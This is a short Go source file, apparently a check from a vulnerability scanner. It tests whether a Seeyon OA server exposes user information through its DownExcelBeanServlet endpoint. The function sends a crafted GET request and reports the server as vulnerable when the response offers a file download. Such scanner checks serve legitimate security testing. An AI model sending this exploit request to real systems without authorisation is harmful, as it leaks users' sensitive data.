package seeyon

import (
	"github.com/yhy0/Jie/pkg/protocols/http"
)

//DownExcelBeanServlet 用户敏感信息泄露

func DownExcelBeanServlet(u string) bool {
	if req, err := http.Request(u+"/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && req.Header.Get("Content-disposition") != "" {
			return true
		}
	}
	return false
}
